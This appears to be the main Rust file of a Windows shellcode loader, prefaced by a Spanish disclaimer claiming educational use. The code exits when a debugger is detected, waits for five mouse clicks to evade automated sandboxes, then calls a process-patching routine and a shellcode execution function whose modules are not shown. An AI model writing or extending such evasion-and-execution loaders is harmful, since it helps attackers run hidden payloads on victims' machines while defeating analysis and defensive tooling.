/*
 * DISCLAIMER
 * Este software está destinado únicamente para propósitos educativos y de investigación. No está diseñado,
 * ni debería ser utilizado, para actividades ilegales. El uso de este software se proporciona "tal cual",
 * sin garantía de ningún tipo, expresada o implícita, incluyendo pero no limitado a las garantías de
 * comercialización, adecuación para un propósito particular y no infracción. En ningún caso los
 * autores serán responsables de cualquier reclamo, daño u otra responsabilidad, ya sea en una acción de
 * contrato, agravio o de otro tipo, que surja de, fuera de, o en conexión con el software o el uso u
 * otras operaciones en el software.
 *
 * Por favor, úselo con responsabilidad y ética.
 */
extern crate kernel32;
extern crate winapi;

use std::process;

use winapi::um::debugapi::IsDebuggerPresent;
use winapi::um::winuser::{GetAsyncKeyState, VK_LBUTTON};

use crate::patch::patch_process;
use crate::utils::sleep_millis;

mod patch;
mod shellcode;
mod utils;

fn main() {
    if unsafe { IsDebuggerPresent() } != 0 {
        println!("Depurador detectado. Terminando el proceso.");
        process::exit(1);
    }

    check_mouse_click(5);

    patch_process();
    shellcode::execute_shellcode();
}

fn check_mouse_click(min_clicks: u32) {
    let mut count: u32 = 0;
    println!("Esperando {} clics del mouse...", min_clicks);

    while count < min_clicks {
        unsafe {
            let key_state = GetAsyncKeyState(VK_LBUTTON);
            if key_state & (1 << 15) != 0 {
                count += 1;
                println!("Clic detectado: {}", count);
                while GetAsyncKeyState(VK_LBUTTON) & (1 << 15) != 0 {
                    sleep_millis(10);
                }
            }
        }
        sleep_millis(100);
    }
}
